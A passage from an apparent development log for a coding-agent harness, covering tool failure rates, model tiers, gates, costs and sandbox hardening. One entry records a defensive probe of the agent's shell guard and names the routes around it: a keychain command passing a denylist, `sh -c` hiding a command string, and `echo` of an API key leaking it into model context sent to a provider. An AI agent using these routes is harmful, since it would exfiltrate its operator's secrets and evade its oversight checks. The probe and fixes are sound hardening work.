that exist, and the changed line was covered because it sat inside a tested
function. `ChangeHasSubstance` is the fifth check and reads the run's own
diff.

**A batch of two fails 2.5x more often than a batch of one.** Over every
thread log: `edits` with one pair fails 24%, with two 58%, and a single
pair 68%. An earlier lane measured batch size and dropped the hypothesis;
that conclusion was reached before failed calls were logged whole, when the
long batches that fail were stored truncated and did not parse. Two causes
were visible once they did:

- Anchors resolved against the text the previous pair produced, not the
  file the model read. Fixed: every anchor now resolves against the file as
  read, and two edits over the same text are refused by index rather than
  appearing as the second one "not found". Measured across three `h6` and
  three `e2` lanes, this moved nothing: 1 of 3 `h6` complete, and no
  overlap ever fired, so the sequencing was a real design flaw and not the
  binding failure
- The binding failure is one path per call. Every `e2` failure is the model
  putting a `memory_test.go` anchor in a call whose path is `memory.go`,
  because the task needs two files and the schema allows one. `e2` has now
  gone 0 for 9 on the fast tier across every configuration

## 2026-08-23 — what e2 was actually failing at

`e2` had gone 1 of 3 checks on nine consecutive fast-pinned runs across
every configuration. Two fixes aimed at it moved nothing, and both were
aimed at the wrong thing.

**Multi-file batching was not it.** Every `e2` failure looked like a test
file's anchor in a call whose path was the source file, so `str_replace`
now takes a path per edit and applies across files, validating all of them
before writing any. Three lanes: still 1 of 3, and the model never once
used a per-edit path. The capability was missing and was worth adding; it
was not what was blocking the task.

**The block was emission.** Three `e2` runs made one `str_replace` call
between them, and it was malformed: 11,917 and 12,018 characters,
compression ratio 0.045, cut off mid-string inside a JSON-escaped test
table. Normal entropy, so not degeneration; the fast tier ran out of its 8k
window inside one call. The cause is the anchor: replacing a declaration
through `str_replace` sends its text twice, once as `old_string` and once
as `new_string`, against a file the model is recalling rather than reading.

**`declare` sends it once.** A Modifier that writes a whole declaration by
name, replacing the existing one or adding a new one to a path, with the
doc comment taken as prose. Measured over three `e2` lanes:

| tool | calls | failed |
|---|---|---|
| `declare` | 11 | 1 |
| `str_replace` | 7 | 7 |

Every one of the three reached 2 of 3 checks, against 1 of 3 on all nine
prior fast-pinned runs. Three `h6` lanes in the same batch all passed 4 of
4 checks, one complete and two stopping on a verification round.

It costs 243 preamble tokens and pushed the fast tier from 2,113 to 2,356,
so the ceiling went from 2,200 to 2,400 deliberately. That is the ceiling
working: a new tool's cost was a decision rather than a discovery.

**Not verified.** Three runs per lane, and the checks that still fail are
the ones asking for a test. No lane has yet reached 3 of 3 on `e2` with a
fast pin, so this moved the wall rather than removing it.

## 2026-08-23 — the stale anchor, and the sequence end to end

`declare` moved `e2` from one check to two, and the third failed the same
way every time: the test compiled against the wrong package qualifier, the
`go-test` gate said so, and the run then spent its remaining turns guessing
`str_replace` anchors against the file as it remembered it rather than as
its own edit had left it.

That is the one thing the harness knows and the model cannot. `Scope` now
orders each path's last read against its last accepted write, and a
`no_match` on a file the run has written since reading says so. It fired
twice and the next call was a `read` both times, which is exactly what it
asks for. It costs zero preamble tokens, because it is an error and is paid
only when the mistake happens.

Mean share of checks held, three runs per lane unless noted:

| lane | h6 | e2 |
|---|---|---|
| lean preamble | 0.79 (6 runs) | 0.33 (2 runs) |
| anchors from read | 0.83 | 0.33 |
| multi-file edits | 0.58 | 0.33 |
| declare | 1.00 | 0.67 |
| stale anchor | 0.67 | 0.78 |

`e2` is the signal: 0.33 on nine consecutive fast-pinned runs across three
configurations, then 0.67, then 0.78, and one run reached 3 of 3 and
completed, which no fast-pinned `e2` run in this sequence had done. `h6`
says nothing at three runs a lane, which is what the 40-70% variance note
predicts.

**Not verified.** Three runs a lane is below what settles anything smaller
than a factor of two, and only `e2` moved by that much. The `h6` numbers
swing 0.58 to 1.00 to 0.67 across lanes that should not have hurt it, which
is the variance and not a regression, but nothing here proves that either.

## 2026-08-23 — e2, end to end, and where the wall actually is

Nine lanes on `e2` with a fast pin, 38 runs, warm server throughout. Mean
share of checks held, and what the edit tools did:

| lane | runs | 3/3 | mean | turns | str_replace | declare |
|---|---|---|---|---|---|---|
| lean preamble | 2 | 0 | 0.33 | 6 | 4/4 failed | - |
| anchors from read | 3 | 0 | 0.33 | 6 | 8/8 failed | - |
| multi-file edits | 3 | 0 | 0.33 | 6 | 1/1 failed | - |
| declare | 3 | 0 | 0.67 | 13 | 7/7 failed | 1/11 |
| stale anchor | 3 | 1 | 0.78 | 11 | 8/8 failed | 0/7 |
| named package | 6 | 1 | 0.72 | 18 | 30/30 failed | 0/27 |
| unread anchor | 6 | 0 | 0.67 | 14 | 19/20 failed | 2/22 |
| declare redirect | 6 | 1 | 0.72 | 12 | 11/12 failed | 0/20 |
| merged imports | 6 | 1 | 0.72 | 10 | 15/16 failed | 0/20 |

**`declare` is the whole move.** `e2` sat at 0.33 for eight runs across
three configurations, and every configuration since `declare` has been
0.67 or better with three runs reaching 3 of 3. Across all of them
`declare` failed 3 of 116 calls and `str_replace` failed 103 of 104. On
this task `str_replace` is simply the wrong tool, and the model still
reaches for it about three times a run.

**The messages bought turns, not checks.** Naming why an anchor missed
(stale, unread, or a whole declaration that belongs to `declare`) cut mean
turns from 18 to 10 and `str_replace` calls per run from 5 to 2.7. Mean
checks did not move: 0.72 before and after. That is the shape of the
finding, and it is worth saying plainly rather than counting the turn
saving as progress on the task.

**Two real tool bugs came out of reading the files runs produced.**
`declare` appended a caller's `import (…)` block after existing
declarations, which Go rejects outright; it now merges those imports into
the file's own block. And a destination in an external test package is
reported as one, because a run cannot see the package clause of a file it
appends to.

**The wall is not the harness.** Every remaining failure is the same
compile error: a test in `package sysinfo_test` referring to `Memory`
rather than `sysinfo.Memory`. The run is told the package it wrote into and
told the qualifier is needed, the gate reports the exact compile error, and
the fast tier still gets it wrong five times in six. That is roadmap item
4's question, not item 2's: the tier's remit rather than the tool surface.

**Not verified.** Six runs a lane settles nothing below a factor of two,
and only the `declare` step was that large. `h6` was not re-run after the
`declare` lanes, so nothing here says these changes left it alone.

## 2026-08-24 — the hosted tiers were never calling anything

Both network tiers pointed at `stealth/ox-alpha`, and it returns a
completely empty completion for every request that carries `tools`. The
same request without the `tools` field answers normally. It reproduces with
a two-property schema, one message, and no harness in the path, so every
escalation this project has made since the tier was configured reached a
model that could not call a tool. The empty turn read as a model choosing
to say nothing, which is why it went unnoticed for as long as it did:
`llm.Usage` counted no reasoning bytes, so a turn that spent its budget
thinking and one that returned nothing were the same row.

Six lanes, three runs each, `e2` and `h6`, balanced pin:

| lane | task | 3/3 | mean | stops |
|---|---|---|---|---|
| coder | e2 | 3/3 | 1.00 | complete, deadline, deadline |
| coder | h6 | 0/3 | 0.75 | malformed_tool_call ×2, deadline |
| instruct | e2 | 0/3 | 0.67 | verify_failed, loop_detected, deadline |
| instruct | h6 | 0/3 | 0.58 | stagnant, loop_detected ×2 |
| coder + recovery | e2 | 3/3 | 1.00 | complete ×3 |
| coder + recovery | h6 | 2/3 | 0.92 | verify_failed ×2, deadline |

**The better model is the one that leaks.**
`qwen/qwen3-coder-30b-a3b-instruct` does these tasks well and renders about
one call in eight as `<function=name><parameter=key>…` prose once the
system prompt is present, which was ending two of three `h6` runs as
`malformed_tool_call`. `qwen3-30b-a3b-instruct-2507` never leaks and is
worse at both tasks. Measured with 15 samples a condition: no system
prompt, the coder model emitted a native call 15 of 15; with this harness's
system prompt, 0-4 of 15. Upstream reads it as a chat-template weakness
([QwenLM/Qwen3-Coder#475](https://github.com/QwenLM/Qwen3-Coder/issues/475)),
where the opening `<tool_call>` tag goes missing most often when a call
follows prose. Wording moves the rate and does not remove it.

**So read the dialect rather than refusing it.** The loop already detected
the markup and only used it to name the failure. `parseToolCallText` reads
the same markup into calls, accepting only a name the registry holds, which
is recovery rather than repair: the model made a well-formed call in a
dialect the provider failed to claim. `h6` went from 0 of 3 to 2 of 3, and
`e2` completed on all three runs.

**Not verified.** Three runs a lane, and only the `e2` and `h6` split moved
by more than the variance. Nothing here says the recovery path is correct
for a dialect other than Qwen's, because no other leaking model was
measured. `e2` passes 3 of 3 hosted against about 1 in 6 on the fast tier,
which is item 4's question about the tier's remit and not evidence about
these lanes.

## 2026-08-24 — reading the corpus, and what it aimed

Twelve lanes had shipped measurement and none of it had been read over the
records. `-stats-corpus` now reports turn attribution, gate rounds, and the
deterministic finish checks beside the tool rates, and takes `-stats-since`
because the file spans three harnesses: 111 of the 190 runs predate the
error taxonomy and report every failure as unclassified, and the
`str_replace` failures recorded before its schema stated a top-level `oneOf`
count a hole a later run cannot fall into. Scoped to 2026-08-23 on, the
unclassified column is empty.

**35% of turns are the harness's.** Over 1,068 attributed turns: 15%
productive, 44% retrieval, 35% harness, 6% prose. The harness share is an
estimate and the other three are exact. It is the number this project is
trying to move, and nothing until now reported it.

**The gates are loud and they are not wrong.** 190 rounds, 68% failed, and
not one retracted a failure over an unchanged tree. Whatever is costing the
run, gate false alarms are not it.

Two live holes came out of the same report and both are closed:

**A tool nothing can answer.** `question` failed 8 of 8 calls, every one
`reading answer: EOF`, because a replay's stdin is not a terminal. It is no
longer offered where nothing can answer, which saves the 107 preamble tokens
it costs on every turn and the turn each call spent. `write` failed 5 of 7,
and all five were the tool refusing by design (three writes over an existing
file, two paths outside the root) recorded as plain failures. Every error
site in `internal/tools` and the four in the loop now name a cause, and
`tool.Errorf` is gone: every hole in the taxonomy came from one existing.

**Two harder tasks, and one of them already earned its place.** `h8` asks
which two constants bound a read and where they live. The fast tier answered
in one turn with no tool calls, naming `MaxReadLinesPerFile`,
`MaxFilesPerRead`, and `reader_config.go`, none of which exist. That is the
`h1` failure mode on a retrieval task, and it is the shape item 3 asked for:
a failure that is not a malformed call. The finish check caught it and the
corpus now records it (`named symbol is not in the index`, 2). `h7` asks for
a bound `read` already has to be added to `list` with a test, and scored 4 of
5 on the fast tier, escalating through all three tiers and failing only on
the test it never wrote. Both checks were proved satisfiable by hand before
the tasks landed.

**Escalation on a stuck gate ships unmeasured.** A gate that fails
identically three times, each after further edits, now moves the run up a
tier rather than waiting for the deadline. The unit tests pin the three
cases that matter, including the two where it must stay silent (a debounced
re-run over one change, and a failure that moved). It did not fire on either
new task: `h7` escalated first through the existing malformed-call path. So
the signal is built and has no live evidence, which the next `e2` lane is
what settles.

**`-deadcode` gates now.** Twelve functions no main reaches are named one at
a time in `deadcodeAllow`, each with why, so the list is the inventory of
what is built and not wired and the check fails on anything new. Proved by
adding an orphan and watching it exit 1.

**Not verified.** One run of each new task settles nothing about their
difficulty, and the stuck-gate escalation has never fired outside a test.

## 2026-08-24 — version control stops being a shell string

`find` and `truncate` are refused at the shell, naming the tool that does
the work instead: `list` and `search` for one, `write` and `str_replace` for
the other. Around 70% of what the shell was used for across 278 logged calls
was work a tool already did, and the prompt asking a model not to reach for
`find` never moved that. `find . -delete` was allowed until now, which is
what made this a safety change rather than a tidying one.

Both version-control CLIs are off the shell too, and a `vcs` tool answers
what a run was asking them: `status` from the changes this run recorded as
it made them, `diff` of the working copy (narrowable to one file), and
`log`. It has three operations and none of them writes, so there is no verb
to force a push, rewrite history, or commit with git in a checkout jj owns.
A force push is refused rather than approved wherever it can still be
reached, because an approval prompt puts the destructive path one keystroke
from the ordinary one and overwriting published history is not recoverable
from this side of the remote.

Nothing the harness does is affected: its own checkpointing calls
`internal/vcs` directly rather than through the shell tool. A run can no
longer commit at all, which matches what item 11 found when the per-edit
checkpoint shipped: jj snapshots the working copy on every command, so
`Capture` records each edit's tree without committing anything, and the
commit half was never needed.

The tool costs 129 preamble tokens against the 24 of 278 shell calls that
asked version control something, and the fast ceiling went 2,400 to 2,500
to pay for it (2,459 now, 34% of what a fast turn can use).

**Three unwired functions wired.** `gate.NeedsFullRun` now bounds how long
selection may keep narrowing: ten narrowed batches or fifteen minutes forces
a sweep of the module, because a selected set that misses a caller is only
ever found by a run that does not select. `replay.Passed` replaced two
hand-rolled copies of itself. `runtime.ListModels` is `wavez -models`. The
allowlist shrank from twelve entries to nine, so it still reads as the
inventory of what is built and not yet wired.

**Not verified.** No replay lane has run against the `vcs` tool, so whether
it actually displaces the shell calls it was built for is unmeasured. The
cadence has unit tests and has never forced a sweep in a real run.

## 2026-08-24 — e2 moves, and the escalation signal is right to stay quiet

Three `e2` lanes on the fast tier with the `vcs` tool and the stuck-gate
escalation in place: 2 of 3 runs held all three checks, one of them
finishing entirely on the fast tier in 9 turns. Mean checks 0.89 against the
0.72 that six configurations had plateaued at, and against 3 of 3 arriving
about once in six before.

**The escalation never fired, and reading why settled it.** The `lint` gate
failed three times in the escalating run and with different content each
time: a missing doc comment, then `undefined: Memory`, then a missing
`t.Parallel()`. That is the "a failure that moved is progress" case the
signal deliberately stays silent on, and it is the same case a unit test
pins. What has changed is the tree: e2's old plateau was five runs in six
spending every turn on one repeated compile error, and that was measured
before the lint gate and `declare` landed. The failure no longer repeats, so
the signal has nothing to fire on here. It is still unfired in a real run,
and the honest reading is that e2 is no longer the task that would settle
it.

**The `vcs` tool was called once, in the run that completed, and worked.**
One call across three runs is evidence it is reachable and not evidence it
displaces anything. The same three runs made one shell call between them,
where earlier e2 lanes made several.

**A gate bug the logs had been carrying for days.** Reading those lanes
turned up `go-test build ./tmp/wavez-replay-x/internal/thread` failing with
`stat /tmp/wavez-replay-x/tmp/wavez-replay-x/internal/thread: directory not
found`. Selection builds a `go test` pattern by prefixing `./`, and a change
path that arrives absolute becomes one go resolves against the root a second
time. Every replay workspace lives under /tmp, so every replay was exposed,
and the run reads it as a build failure and spends turns chasing a directory
that was never missing. Paths are now made relative at the coordinator,
which is also the shape gate-output trimming matches its frames against.

**Not verified.** Three runs at this variance settles a factor of two and
nothing smaller, and 0.72 to 0.89 is not that. Which of the three changes in
flight moved it is unseparated.

## 2026-08-24 — the allowlist, and what four measurements said about the harness

Seven lanes, three of them measurements that changed a decision rather than
confirming one.

**The guard was a denylist and it let the key command through.** A probe
against it ran `security find-generic-password -w -s wavez-openrouter`, this
project's own key command, with no prompt, along with `nc`, `osascript`,
`launchctl load`, and `ssh-add -L`. Nothing had a rule, so nothing objected.
The classifier now decides from a list of 51 commands, drawn from what 177
logged shell calls actually invoked plus the read-only neighbors of each,
and `shellAllow` in `.wavez.pkl` widens it. Shell interpreters are off the
list deliberately, which is what closes `sh -c '<anything>'` as a way to
hand the classifier a string it never reads. `curl` and `kill` moved to
NeedsApproval, and two tests were changed to record the tightening rather
than worked around.

**The network was never the exfiltration channel.** The sandbox denies
everything but loopback, and that is not what stops a key leaving the
machine: whatever a command prints enters the thread's context, and the next
hosted turn ships that context to the provider. `echo $OPENROUTER_API_KEY`
reached the key through a command the guard allows by name. Reads of `~/.ssh`,
`~/.aws`, `~/.config/gh`, the keychain, and both shell histories are now
denied by the profile, and any variable named with KEY, TOKEN, SECRET,
PASSWORD, CREDENTIAL, or AUTH is dropped before the command starts. Both
proven by probe: empty output and `Operation not permitted`.

**78% of the lint findings a model read were not worth a turn.** 264
findings reached models across 58 threads, and the first tally was wrong
twice. 76 of them arrived as a raw dump under "no output line named a
changed file", repeating identically for four or five rounds, which was the
gate path bug rather than the model. On undegraded rounds only: 184
findings, of which 130 were `typecheck`, 32 missing doc comments, 14 missing
`t.Parallel()`, and 8 everything else. `typecheck` is the linter reporting a
compile error the build gate names in the same round, so the lint gate now
drops those and abstains when nothing else is left. The 14 became
`internal/gofix`, which the format gate runs beside gofmt, so they cost no
turn and no model. Its check against being written too broadly is that it
finds nothing to do in any of this repo's 215 test files, which two
over-broad first cuts failed.

**A parallel repair model is the wrong shape, and the config had one real
defect.** Two writers on one tree is what the directory leases exist to
prevent, so a repair turn serializes behind the main run anyway and the cost
being paid is the turn rather than the tokens in it. The one genuine config
defect was `gocritic`'s `unnamedResult` demanding the named returns
`nonamedreturns` forbids, hit on `AddParallelCalls`. Fixed in
[my_go_template](https://github.com/KyleKing/my_go_template), which made 13
`//nolint:gocritic` suppressions across this repo dead and deletable.
Nothing else earned a change: `nlreturn` is 3 of 54 findings, which is not
evidence about a rule.

**`vcs` did not displace the shell calls it replaced.** Offered on 5
recorded runs, called once, while those same runs made 6 git and jj shell
stages. Three of the six were `git checkout -- <file>` or `jj checkout --
<file>`, each refused by the guard, because reverting is a write and `vcs`
has no verb that writes. That is `h7`, which spent 44 turns and reached its
deadline with no way to undo its own edit. `undo` answers it without
reaching version control at all: it restores from bytes the run snapshotted
before its own first edit, so the worst it can discard is work the same run
made. 57 preamble tokens, which raised the ceiling from 2,500 to 2,550.

**Not settled.** The `undo` tool has not been measured, and one lane is what
built it. `str_replace`'s failure rate reads 56% early against 75% late, and
that comparison is invalid: the late corpus is weighted with lanes built
deliberately to make `str_replace` fail (`unread-anchor`, `stale-anchor`,
`merged-imports`). The escalation signal is still unfired outside its unit
tests. The harness still costs 35% of turns, unmoved, and none of today's
changes has a measurement against it.

## 2026-08-24 — undo ships uncalled, and the escalation signal is unreached

**The escalation signal has never fired.** Grepping all 260 thread logs for
the event it writes returns nothing, against 271 gate rounds of which 160
failed. Its condition wants a failure repeating *identically* across edits,
and the corpus's failures move between rounds, which is the case it
deliberately stays silent on. So it is not unproven, it is unreached, and
the choice is to loosen the condition or delete the branch.

**`undo` was called zero times in the two lanes that offered it.** Same
pattern as `vcs`. `h7` did improve across those lanes, from 44 turns and 3
of 5 checks to 7 turns and 4 of 5, with 12 shell calls falling to none and
`str_replace` errors from 7 of 11 down to 1 of 2. `undo` cannot be the cause
of an improvement in a run that never called it. The parse check landed in
the same window and reports a broken edit in the turn that made it, which is
the thrash those numbers show going away, so that is the likelier cause and
neither is separated by one run each.

**`h10` is the first task in the set requiring a test to fail first**, built
on a real bug rather than an invented one: `clip` in `internal/edit`
byte-slices a long line at 200 bytes and can split a multi-byte character,
putting invalid UTF-8 into the near-match report a model reads to fix its
anchor (proved by probe, and left in the tree so the task stays winnable,
the way `h6`'s `truncate` bug is). The fast tier scored 1 of 4: it wrote
`TestClip_MultiByteBoundary`, which fails, and never fixed `clip`. Writing
the failing test and stopping there is the discrimination the task was for.

**Not settled.** Whether `undo` is reached at all. Whether the parse check
caused h7's improvement. The harness's 35% of turns, still unmeasured
against any of this.

## 2026-08-24 — the stuck counter was clearing itself, and half the near-match reports were blank

**The escalation signal is unreached for a reason the previous entry got
wrong.** Two defects, both proved from the logs rather than argued.
`escalateIfStuck` returned in silence whenever the run was already on the
top tier, so an absent log line was never evidence the condition had not
held. And `noteFalseAlarms` reset `repeats` to zero whenever a gate failure
arrived without the change count having grown, which is exactly what a
debounced re-run looks like: one turn's edits reach the runner as two
batches. Thread `p-dkwtttv5vpag` holds the sequence line by line, three
identical lint failures with an edit between the first two and a re-run
before the third, counter cleared. Replaying all 262 thread logs against the
fixed rule, three threads reach the condition where none did, all of them
fast-tier runs with a tier above to move into. The condition did not need
loosening; it needed to stop discarding its own evidence.

**The largest single `str_replace` failure has a name and it is not the fast
tier.** 81 of 322 logged errors are `old_string` and `new_string` carrying
the same text. 40 come from runs that only ever used the balanced tier and
11 more from runs that used balanced and deep, against 30 from runs that
touched the fast tier at all, which rules out the fast tier's grammar. The tool now
separates the two mistakes behind it: the file already holds that text, or
the text sent is the replacement and the anchor was never sent.

**Half of every near-match report was blank.** Of the 93 reports logged, 48
rendered as `source has: ` with nothing after it. A probe reproduces that
shape exactly from one cause: an anchor copied without the file's blank
lines. `Replace` now matches such an anchor, skipping blank source lines and
replacing the whole span it covered, shifting the replacement by the
difference between the anchor's indentation and the source's rather than
pairing lines by position, which mangled a closing brace in the first cut. A
blank line that still reaches a report now says so.

**The parse check has its first live evidence.** In `h11`'s run, seq 273
carried it and the model's next words were "I made a typo in the variable
name". That is the turn it was built to buy back.

**`h11` also found an upstream mangling.** The balanced tier emitted `¬` for
`&not`, so a run trying to write `&notUniqueErr` could not: every attempt
collapsed to the same text and the file stayed unparsable. Nothing in this
repo unescapes HTML entities, so the substitution happens before the bytes
reach us. One occurrence in the whole corpus, all six log lines from that
one thread, so it is recorded and not repaired: a table of entity names to
undo would be built on a single observation.

**What that run did settle** is that the no-op advice must never suggest the
work might be done. It told a run to move on while its file would not parse.
A call whose two halves collapsed says nothing about the file's state, so
neither branch says anything about it now.

**Four `e2` fast lanes then measured the wrong way and are reported as
such.** Against the eleven lanes of the four labels before them, median
turns went from 9 to 13.5 and median harness turns from 3 to 6.5, while
checks held 3 of 3 on two of four against four of eleven. The ranges
overlap (the before set holds 14, 15, and 17), four runs against eleven
decides nothing, and one of the four ran at 2.1 output tokens per second
against a median of 25 because the machine was busy, which is the coupling
[AGENTS.local.md](../../AGENTS.local.md) already warns about. So the
mechanism is proved by unit test and probe and the effect on a run is not,
and the direction of the little evidence there is runs against it. Whether the fixed stuck counter
fires in a live run. Whether `undo` is ever called. The harness's 34% of
turns, still unmeasured against any of this.

## 2026-08-24 — the fast tier moves off the laptop and hits a rate limit instead

**Serving `fast` from OpenRouter made the lanes worse, and the reason is
measurable.** Four hosted `e2` lanes against the four local ones: decode
roughly doubled (median 37.8 output tokens per second against 25.4, with one
local lane at 2.1 under load) and three of four still hit the three-minute
deadline, at 4, 4, and 9 turns against a local median of 13.5. Per-turn
output went from ~190 tokens to ~930. The thread events say where: one turn
recorded 2,287 output tokens against 8,064 bytes of reasoning, none of which
reaches a tool or the thread's history. Prefix cache reuse went the same way,
from 89-96% of input tokens locally to 0%, 0%, 0%, and 41.5%. Faster decode
bought fewer turns.

**`Thinking` was a no-op on every hosted tier.** It only ever emitted
llama.cpp's `chat_template_kwargs.enable_thinking`, which OpenRouter does not
read; OpenRouter takes `reasoning`. Both spellings now go out on every
request, each provider ignoring the other's. A direct probe settles the
effect: `qwen/qwen3-8b` answering "say ok" costs 11 completion tokens with
`reasoning.enabled` false, against the 79 the same prompt costs with
reasoning on. A tier can now carry the toggle in config (`thinking` on the
pkl `Tier`), which a thread's own pin still overrides.

**Then three lanes measured a rate limit rather than the change.** All three
escalated off the fast tier and ran their tasks on `balanced`, and the
records read as though the router had decided that about the task. It had
not: OpenRouter's shared pool answers `qwen/qwen3-8b` with a 429 saying it is
temporarily rate-limited upstream, reproducible with one curl. Every
fast-tier lane since the move is contaminated the same way, so the four
hosted lanes above measure a tier that was partly unavailable.

**The move left no trace, which is the defect worth keeping.** A provider
failure escalated the run and logged nothing at all, so three lanes running
their whole task a tier up looked like routing. Each move is now one line
naming the tier, the model, and the provider's own error, and the 429 above
was read straight off it. This is the second instance of the same shape as
the stuck counter: a signal that clears its own evidence reads afterwards as
a condition that never held.

**What is not settled.** Whether reasoning off improves a run rather than a
request, because no lane has yet held the fast tier for a whole task. That
needs the fast tier to answer reliably, which means a provider key, provider
routing, or the loopback llama-server, and it is a decision rather than a
measurement. Two lanes on the fixed set finished 3 of 3 in 9 and 10 turns
with three fast turns each, which is the best `e2` has recorded and is not
attributable while the tier is dropping requests.

## 2026-08-25 — the fast tier comes home, and two tools get decided

**The fast tier is served from this laptop and moves to OpenRouter per
turn.** Both endpoints were wrong on their own: local decode swung 12x with
what else the machine was doing (2.1 output tokens per second against a
median of 25), and OpenRouter's shared pool answers `qwen/qwen3-8b` with a
429 partway through a run, with only Alibaba serving that model so there is
nothing to route to. A `Tier` now names an `overflow` endpoint and a load per
core at which turns go there, read from `vm.loadavg` divided by
`hw.logicalcpu`. The pick is per turn, because what makes a local turn slow
is a gate run that starts mid-thread. Proved live in both directions with the
loopback port pointed at nothing: at a threshold of 0 three fast turns
completed, and at 99 the same turn dialed the dead port and escalated.

**Every hosted request denies data collection.** `provider:
{data_collection: "deny"}` restricts OpenRouter routing to providers that do
not store prompts, which matters because a coding agent sends a private
repository's contents on every turn. It is unconditional rather than
configurable. A probe settles that it is enforced rather than advisory: a
free endpoint that answers without it comes back `No endpoints found matching
your data policy (Free model training)` with it.

**Each backend now gets its own spelling instead of the union.** One client
still speaks the shared 95% (SSE framing, tool-call assembly, error mapping)
and a `Dialect` decides the four keys that differ: `chat_template_kwargs` and
`repeat_penalty` for llama.cpp, `reasoning` and `provider` for OpenRouter.
Sending every key to both worked, because each drops what it does not know,
and it hid which knob a tier actually had for four lanes.

**The tier move was invisible and now is not.** A provider failure escalated
a run and logged nothing, so three lanes that ran their whole task a tier up
read afterwards as routing. One line now names the tier, the model, and the
provider's own error, and the 429 above was read straight off it. Same shape
as the stuck counter: a signal that clears its own evidence reads as a
condition that never held.

**The stuck signal fires.** Two of four sequential `e2` lanes reached it, both
on the `lint` gate, both escalating, and both were the lanes that plateaued
(27 turns to a deadline and 20 to a failed verification, against 9 and 10 for
the two that did not reach it). That closes what the previous entry left open.

**Two more `str_replace` causes, both found by reading a lane rather than the
counts.** The batch shape's description said an edit may name its own path
and the schema did not declare one, so the capability existed in Go, was
promised in prose, and could not be emitted under the grammar a local turn
decodes with. And the near-match report pointed at whichever alignment scored
highest, so a source that had gained a line the anchor lacked scored higher
shifted by one and the report blamed the anchor's first line, the one line
that was right. A lane read that and re-sent the same anchor five times. The
report now prefers the alignment whose first line matches.

**`vcs` is out.** At 226 runs it was called 4 times while the corpus made 21
git and jj shell calls, 10 of them the `status`/`diff`/`log` it existed to
displace. The reason it lost is that reaching past it worked: `Shell` answers
a read-only version-control command from what the run recorded as it wrote,
before the guard classifies anything, so the tool was never what answered
those questions. 102 preamble tokens back and the ceiling drops to 2,450.
The refusal of a version-control write now names `undo`.

**`undo` cannot be decided by a task, and that is the finding.** `h12` asks
for a method and then for `memory.go` to end at the bytes it started with.
Three lanes, zero `undo` calls, because the shortest path through the task is
to never edit `memory.go` at all and one lane took it and passed 4 of 4 in 8
turns. A replay checks the end state, so no prompt can require an
intermediate one. Only a run that has already broken something gets
cornered, which is not something a benchmark can ask for, so the count stays
at zero whatever tasks are added and the question is whether 57 tokens of
insurance is worth it.

**What is not settled.** Whether reasoning off improves a run rather than a
request, which needs lanes that hold the fast tier for a whole task and now
can have them. Whether the two `str_replace` fixes move turns, which is the
next set of lanes. The harness's 34% of turns, unchanged at 1,450 turns.

## 2026-08-25 — parallel lanes were grading the tool on a tree jj had rewritten

**The measurement was wrong before the tool was.** Four `deep` lanes run at
once put `h13` at 3 of 5 and `h10` at 1 of 4. The same tasks on the same tier
under the fix score 5 of 5 and 4 of 4. Nothing about the model changed.

**Root cause, proved from jj's own operation log.** Replay workspaces share
one jj store, and nearly every jj command snapshots the working copy, so a
read is a write to the operation log. Four lanes each snapshot per accepted
edit, add and forget a fail-to-pass workspace per gate round, and abandon
their workspace at the end. Two four-lane windows produced 3 and 9
`reconcile divergent operations` entries; the window after the fix produced
2, and those coincide with `jj` typed by hand, which does not take the lock.
The damage was visible in one lane directly: `h13` recorded "deadline
reached, 5 file(s) changed" and its workspace held 2 of those files, its
working copy marked `(divergent)`, its checks graded against the remains. Its
successful multi-file edit to `Wavez.pkl` was gone by the time anything read
it. Every jj invocation now serializes on a lock in the shared store, which
costs milliseconds against turns that cost seconds, so lanes still overlap
where the time goes.

**What that had been hiding.** `h13` is a new task whose retrieval crosses
the pkl and Go boundary: add a config key that exists in the pkl schema, its
Go mirror struct with pkl tags, and the Config it overlays onto. Under the
race it read as the model failing to reach the pkl side. It was not. Both
locked lanes edited all three files and passed every check, one of them
through a single multi-file `str_replace` batch using the per-edit `path`
that the schema only started declaring this session.

**The deep tier is a different model now and it changes what the tool can
do.** `balanced` and `deep` were both `qwen/qwen3-coder-30b-a3b-instruct`, so
every escalation re-ran the failure on the model that had just produced it.
`deep` is `moonshotai/kimi-k2.7-code`, and two tasks that had never once been
done are now done: `h7` at 5 of 5 in 8 turns against 0 of 3 runs and a mean
of 27 turns, and `h2` at 2 of 2 in 11 turns against 0 of 10. `h11` went 1 of
4 to 4 of 4. Fourteen providers serve it, so there is no repeat of the
single-provider rate limit the fast tier hit.

**Nothing was as expensive as it was charged.** Cached prompt tokens were
billed at the full input rate. Kimi reads a cached token at $0.19 per
million against $0.67 fresh, and 92% of every deep turn's prompt is a cache
hit, so a run was charged about 2.7x what it spent. The `h13` lane that
stopped as `cost_ceiling` at $1.00 had really spent $0.35. A later `h13`
lane, priced correctly, finished all 5 checks for $0.58 and would have been
killed at turn 26 of 44 under the old arithmetic. OpenRouter's own total
for this project's whole history is $2.13.

**Pinning `deep` is what costs, not `deep` itself.** Two lanes on the same
task, one pinned and one on the default tier with escalation:

| task | tier | turns | checks | spend |
| --- | --- | --- | --- | --- |
| h13 | pinned deep | 44 | 5/5 | $0.578 |
| h13 | default, no escalation used | 28 | 5/5 | $0.045 |
| h7 | pinned deep | 11 | 5/5 | $0.029 |
| h7 | default, escalated 4 turns | 45 | 5/5 | $0.087 |

Both reach the same answer either way. `h13` spends 33 of 44 turns on
retrieval, and paying the strongest tier to read files is where the 13x
went; `h7` is the opposite, where the strong model's 11 turns beat 45 cheap
ones. So a pin is worth it where the task is reasoning-bound and not where
it is retrieval-bound, and the benchmark's habit of pinning `deep` was
measuring the pin.

**The wall clock was the bound that was actually binding.** 180s was set
against a local-model era. Runs that pass every check take 45s to 501s, so
the deadline was cutting off the slowest fifth of the work that would have
succeeded and recording it as a failure. Both `h13` comparisons above hit
that deadline at 16 and 11 turns on the first attempt. It is 600s, and
spend is the bound that binds now, which is the one that measures
something.

**The anchor fix holds where it was aimed.** Across four `e2` lanes, `no_match`
fell from 9 failures in 61 tool calls to 2 in 91. What replaced it at the top
is the no-op replacement (7 of 91), and reading those shows a copy-paste slip
in a repetitive edit sequence that the run corrects on the next turn, which
is a one-turn cost rather than a failure mode.

**A wrong argument shape now reads as JSON rather than as Go.** Every tool
handed the decoder's own message back, naming Go types
("[]tools.editPair"). Two logged runs sent `edits` as a string holding the
array, got that message, and did not change the shape. One shared decoder
now says which field it was, what shape it takes, and what arrived.

**Retrieval is where the turns go.** Across the live corpus, 60% of turns
are retrieval, 22% harness, and 15% productive. `str_replace` still fails
23% of its calls (`no_match` 9, `bad_input` 5 of 62), and 76% of gate rounds
fail. Cost per completed task is now a column in `wavez -stats-corpus`:
